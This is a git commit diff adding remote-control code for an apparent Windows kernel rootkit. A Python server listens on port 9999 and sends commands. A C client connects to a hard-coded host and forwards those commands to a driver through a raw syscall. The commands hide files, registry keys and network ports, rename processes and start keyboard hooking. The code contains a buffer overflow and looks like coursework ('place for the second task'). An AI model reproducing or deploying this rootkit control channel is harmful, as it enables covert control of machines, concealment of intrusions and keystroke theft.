ed7e091123b78a53250beb80a3fd3d49b599f693
redrockstyle <unconfigured@null.spigotmc.org>
2022-04-17 18:51:24 +0500

    remote connection

---
+++ netpy/server.py
@@ -0,0 +1,106 @@
+import socket
+import struct
+
+
+class DriverController:
+    def __init__(self, host: str | None = None, port: int | None = None):
+        self._host = host or '0.0.0.0'
+        self._port = port or 9999
+        self._available_commands = (
+            "0x26", "rpid", "rname", "hfile", "key", "net_src", "net_dst"
+        )
+        self._commands_with_result = (
+            "pids", "hooks"
+        )
+        self._oks = (b'ok', b'OK')
+        self._socket = None
+        self._inited = False
+
+    def init(self):
+        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._socket.bind((self._host, self._port))
+        self._socket.listen()
+        self._socket, _ = self._socket.accept()
+        self._inited = True
+
+    def start(self):
+        if not self._inited:
+            raise RuntimeError("You must call .init() first!")
+        command = None
+        while command != 'quit':
+            command = input('cmd >')
+            first_part = command.split()[0]
+            if not (first_part in self._available_commands or first_part in self._commands_with_result):
+                print("Please, do things as it says here:")
+                self.help()
+                continue
+            payload_size = self._form_size_of_payload(command)
+            self._socket.send(payload_size)
+            self._check_ok(self._socket.recv(2))  # ok
+            self._socket.send(command.encode())
+            self._check_ok(self._socket.recv(2))  # ok
+            if command in self._commands_with_result:
+                size = self._socket.recv(4)  # size of answer
+                if size == b'fail':
+                    self._announce_fail()
+                    continue
+                self._socket.send(b'OK')
+                size = int.from_bytes(size, 'big')
+                resp = self._socket.recv(size)  # answer
+                self._print_result(command, resp)
+        self._socket.close()
+
+    @staticmethod
+    def _form_size_of_payload(payload: str) -> bytes:
+        result = len(payload)
+        return struct.pack("i", result)
+
+    def _check_ok(self, answer: bytes):
+        if answer not in self._oks:
+            raise RuntimeError("Server sent wrong answer")
+
+    @staticmethod
+    def _announce_fail():
+        print('Looks like driver failed')
+
+    @staticmethod
+    def help():
+        print(r"""
+        pids - list processes
+        hooks - list driver activity
+        kdb - start hooking keyboard
+        unkbd - stop hooking keyboard
+
+        pid <name | pid> <new pid> - change process pid by name or old pid
+        unpid - cancel changing pid
+
+        ---- place for the second task
+        ---- place for the second task
+
+        file <(relative | full nt) filename> - hide file
+        unfile - stop hiding file
+
+        key \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Driver - hide key
+        ukney - unhide key
+        """)
+
+    @staticmethod
+    def _print_result(cmd: str, result: bytes) -> None:
+        result = result.decode()
+        if cmd in ('pids', 'hooks'):
+            info = result.split('\n')
+            for line in info:
+                print(line)
+        else:
+            raise NotImplementedError("Not yet implemented result for this command")
+
+
+def main():
+    dc = DriverController()
+    dc.help()
+    dc.init()
+    dc.start()
+
+
+if __name__ == '__main__':
+    main()
--- use/main.c
+++ use/main.c
@@ -12,45 +12,23 @@
 #define DRIVER_NAME "driver"
 #define DRIVER_FILE "Driver.sys"
 
-#define SERVER_PORT	9999
+int InitSocket();
+int ConnectToServer();
+char* RecvCommand();
+int RecvAll(char* buf, unsigned int* len);
+void SendOK();
+void SendFail();
+int GetCommand(const char* payload_string, PCOMMAND payload, int* has_result);
+void GetTestCommand(const char* to_parse, PCOMMAND cmd);
+void GetRpidCommand(const char* to_parse, PCOMMAND cmd);
+void GetRnameCommand(const char* to_parse, PCOMMAND cmd);
+void GethFileCommand(const char* to_parse, PCOMMAND cmd);
+void GetKeyCommand(const char* to_parse, PCOMMAND cmd);
+void GetNetSrcCommand(const char* to_parse, PCOMMAND cmd);
+void GetNetDstCommand(const char* to_parse, PCOMMAND cmd);
 
-#define HTONS(a)  (((0xFF&a)<<8) + ((0xFF00&a)>>8))
 
-typedef struct _CONNINFO101 {
-	unsigned long status;
-	unsigned long src_addr;
-	unsigned short src_port;
-	unsigned short unk1;
-	unsigned long dst_addr;
-	unsigned short dst_port;
-	unsigned short unk2;
-} CONNINFO101, * PCONNINFO101;
-
-typedef struct _CONNINFO102 {
-	unsigned long status;
-	unsigned long src_addr;
-	unsigned short src_port;
-	unsigned short unk1;
-	unsigned long dst_addr;
-	unsigned short dst_port;
-	unsigned short unk2;
-	unsigned long pid;
-} CONNINFO102, * PCONNINFO102;
-
-typedef struct _CONNINFO110 {
-	unsigned long size;
-	unsigned long status;
-	unsigned long src_addr;
-	unsigned short src_port;
-	unsigned short unk1;
-	unsigned long dst_addr;
-	unsigned short dst_port;
-	unsigned short unk2;
-	unsigned long pid;
-	PVOID    unk3[35];
-} CONNINFO110, * PCONNINFO110;
-
-SOCKET sserver;
+SOCKET socketServer;
 
 unsigned int AddressSystemCall;
 __declspec(naked) void FastSystemCall(void) {
@@ -64,12 +42,6 @@ __declspec(naked) void SysCall(void) {
 	__asm ret
 }
 
-int InitSocket();
-int ConnectToServer();
-unsigned char* RecvCommand();
-int RecvMove(unsigned char* buffer, int* len);
-void SendOK();
-
 int main(int argc, char* argv[]) {
 	if (argc > 1) {
 
@@ -79,21 +51,31 @@ int main(int argc, char* argv[]) {
 
 		// START CLIENT
 		if (!strcmp(argv[1], "server")) {
-			unsigned char* commandBuffer;
-			if (!InitSocket()) {
+			unsigned char* command;
+			if (InitSocket() != 0) {
 				return 1;
 			}
-			if (!ConnectToServer()) {
+			if (ConnectToServer() != 0) {
 				return 1;
 			}
-			while (TRUE) {
-				int res = 0;
-				PCOMMAND cmd;
-				printf("Wait command...\n");
-
-				commandBuffer = RecvCommand();
-				cmd = (PCOMMAND)commandBuffer;
-				printf("Command %08X %08X %08X\n", (unsigned int)cmd->flags, (unsigned int)cmd->target, (unsigned int)cmd->change);
+			while (1) {
+				int has_result = 0;
+				puts("waiting for command...");
+				command = RecvCommand();
+				printf("cmd recved: %s\n", command);
+				if (GetCommand(command, &cmd, &has_result) != 0) {
+					return 1;
+				}
+				__asm {
+					push 0
+					push 0
+					lea eax, cmd
+					push eax
+					push SIGNATURE_SYSCALL
+					mov eax, 0x26
+				}
+				AddressSystemCall = (unsigned int)FastSystemCall;
+				SysCall();
 			}
 		}
 		// TEST SYSCALL
@@ -261,81 +243,191 @@ int main(int argc, char* argv[]) {
 }
 
 int InitSocket() {
-	WSADATA wsaData;
-	int ires = WSAStartup(MAKEWORD(2, 2), &wsaData);
-	if (ires != 0) {
-		printf("WSAStartup exit with code %d\n", ires);
-		return ires;
+	WSADATA wsa;
+	int error = WSAStartup(MAKEWORD(2, 2), &wsa);
+	if (error != 0) {
+		printf("Error on WSAStartup()");
 	}
+	return error;
 }
 
 int ConnectToServer() {
 	struct sockaddr_in server;
-
-	printf("Create socket\n");
-	if ((sserver = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
-		printf("Error create socket with code %d\n", WSAGetLastError());
+	if ((socketServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
+		printf("Could not create socket : %d.\n", WSAGetLastError());
 		WSACleanup();
 		return 1;
 	}
-
-	printf("Connecting...\n");
+	printf("Socket created. Connecting...\n");
 	memset(&server, 0, sizeof server);
 	server.sin_addr.s_addr = inet_addr("192.168.91.1");
 	server.sin_family = AF_INET;
-	server.sin_port = htons(SERVER_PORT);
+	server.sin_port = htons(9999);
 
-	if (connect(sserver, (struct sockaddr*)&server, sizeof(server)) < 0) {
-		printf("Connect error with code %d\n", WSAGetLastError());
-		closesocket(sserver);
+	//Connect to remote server
+	if (connect(socketServer, (struct sockaddr*)&server, sizeof(server)) < 0) {
+		printf("Connect error:%d.\nPress a key to exit...", WSAGetLastError());
+		closesocket(socketServer);
 		WSACleanup();
 		return 1;
 	}
 
-	printf("Connected\n");
+	puts("Connected");
 	return 0;
 }
 
-unsigned char* RecvCommand() {
-	unsigned char* cmd;
-	unsigned int exactSize = sizeof(COMMAND);
-	unsigned char* bufferSize[4] = { 0 };
-
-	if (!RecvMove(bufferSize, &exactSize)) {
+char* RecvCommand() {
+	char buffer_for_size[4] = { 0 };
+	unsigned int exact_size = 4;
+	char* command = NULL;
+	if (RecvAll(buffer_for_size, &exact_size) != 0) {
+		return "";
+	}
+	exact_size = (buffer_for_size[3] << 24) + (buffer_for_size[2] << 16) + (buffer_for_size[1] << 8) + buffer_for_size[0];
+	SendOK();
+	command = (char*)malloc(exact_size);
+	if (RecvAll(command, &exact_size) != 0) {
 		return "";
 	}
 	SendOK();
-
-	cmd = (unsigned char*)malloc(exactSize);
-	if (!RecvMove(cmd, &exactSize)) {
-		return "";
-	}
-	SendOK();
-
-	cmd[exactSize] = 0;
-	return cmd;
+	command[exact_size] = 0;
+	return command;
 }
 
-int RecvMove(unsigned char* buffer, int* len) {
-	int total = 0;
-	int bytesleft = *len;
+void SendOK() {
+	send(socketServer, "OK", 2, 0);
+}
+
+void SendFail() {
+	send(socketServer, "fail", 4, 0);
+}
+
+int RecvAll(char* buf, unsigned int* len) {
+	int total = 0;        // how many bytes we've received
+	int bytesleft = *len; // how many we have left to receive
 	int n = -1;
 
-	while (total < *len) {
-		n = recv(sserver, buffer + total, bytesleft, 0);
-		if (n <= 0) break;
+	while ((unsigned int)total < *len) {
+		n = recv(socketServer, buf + total, bytesleft, 0);
+		if (n <= 0) { break; }
 		total += n;
 		bytesleft -= n;
 	}
 
-	*len = total;
+	*len = total; // return number actually received here
 
-	return (n <= 0) ? -1 : 0;
+	return (n <= 0) ? -1 : 0; // return -1 on failure, 0 on success
 }
 
-void SendOK() {
-	send(sserver, "OK", 2, 0);
+int GetCommand(const char* payload_string, PCOMMAND payload, int* has_result) {
+	unsigned int len_of_command = 0;
+	char* first_command = NULL;
+	unsigned int i = 0;
+	for (; payload_string[i] != '\0'; i++) {
+		if (payload_string[i] == ' ') {
+			len_of_command = i;
+			break;
+		}
+	}
+	if (len_of_command == 0) {
+		len_of_command = i;
+	}
+
+	first_command = (char*)malloc(len_of_command + 1);
+	memcpy(first_command, payload_string, len_of_command);
+	first_command[len_of_command] = 0;
+
+	if (!strcmp(first_command, "0x26")) {
+		printf("test 0x26\n");
+		payload_string = payload_string + len_of_command + 1;
+		GetTestCommand(payload_string, payload);
+		goto end_label;
+	}
+	else if (!strcmp(first_command, "rpid")) {
+		payload_string = payload_string + len_of_command + 1;
+		GetRpidCommand(payload_string, payload);
+		goto end_label;
+	}
+	else if (!strcmp(first_command, "rname")) {
+		payload_string = payload_string + len_of_command + 1;
+		GetRnameCommand(payload_string, payload);
+		*has_result = 1;
+		goto end_label;
+	}
+	else if (!strcmp(first_command, "hfile")) {
+		payload_string = payload_string + len_of_command + 1;
+		GethFileCommand(payload_string, payload);
+		goto end_label;
+	}
+	else if (!strcmp(first_command, "key")) {
+		payload_string = payload_string + len_of_command + 1;
+		GetKeyCommand(payload_string, payload);
+		goto end_label;
+	}
+	else if (!strcmp(first_command, "net_src")) {
+		payload_string = payload_string + len_of_command + 1;
+		GetNetSrcCommand(payload_string, payload);
+		goto end_label;
+	}
+	else if (!strcmp(first_command, "net_dst")) {
+		payload_string = payload_string + len_of_command + 1;
+		GetNetDstCommand(payload_string, payload);
+		goto end_label;
+	}
+	return -1;
+
+end_label:
+	free(first_command);
+	return 0;
 }
-void SendFail() {
-	send(sserver, "FAIL", 4, 0);
+
+void GetTestCommand(const char* to_parse, PCOMMAND cmd) {
+	cmd->target = NULL;
+	cmd->change = NULL;
+	cmd->flags = COMMAND_TEST_COMMAND;
+}
+
+void GetRpidCommand(const char* to_parse, PCOMMAND cmd) {
+	cmd->change = malloc(100);
+
+	if (isdigit(to_parse[0]) != 0) {
+		sscanf(to_parse, "%d %s", &(unsigned int)cmd->target, (char*)cmd->change);
+		cmd->flags = COMMAND_BUFFER_NUMBER | COMMAND_RENAME_PROCESS;
+	}
+}
+
+void GetRnameCommand(const char* to_parse, PCOMMAND cmd) {
+	cmd->change = malloc(100);
+	cmd->target = malloc(100);
+
+	sscanf(to_parse, "%s %s", (char*)cmd->target, (char*)cmd->change);
+	cmd->flags = COMMAND_BUFFER_POINTER | COMMAND_RENAME_PROCESS;
+}
+
+void GethFileCommand(const char* to_parse, PCOMMAND cmd) {
+	cmd->target = malloc(100);
+
+	sscanf(to_parse, "%s", (char*)cmd->target);
+	cmd->change = NULL;
+	cmd->flags = COMMAND_BUFFER_POINTER | COMMAND_HIDE_FILE;
+}
+
+void GetKeyCommand(const char* to_parse, PCOMMAND cmd) {
+	cmd->target = malloc(100);
+	cmd->change = malloc(100);
+
+	sscanf(to_parse, "%s %s", (char*)cmd->target, (char*)cmd->change);
+	cmd->flags = COMMAND_BUFFER_POINTER | COMMAND_RENAME_KEY;
+}
+
+void GetNetSrcCommand(const char* to_parse, PCOMMAND cmd) {
+	sscanf(to_parse, "%d", &(unsigned int)cmd->target);
+	cmd->change = NULL;
+	cmd->flags = COMMAND_BUFFER_SRC_PORT | COMMAND_HIDE_NET;
+}
+
+void GetNetDstCommand(const char* to_parse, PCOMMAND cmd) {
+	sscanf(to_parse, "%d", &(unsigned int)cmd->target);
+	cmd->change = NULL;
+	cmd->flags = COMMAND_BUFFER_DST_PORT | COMMAND_HIDE_NET;
 }
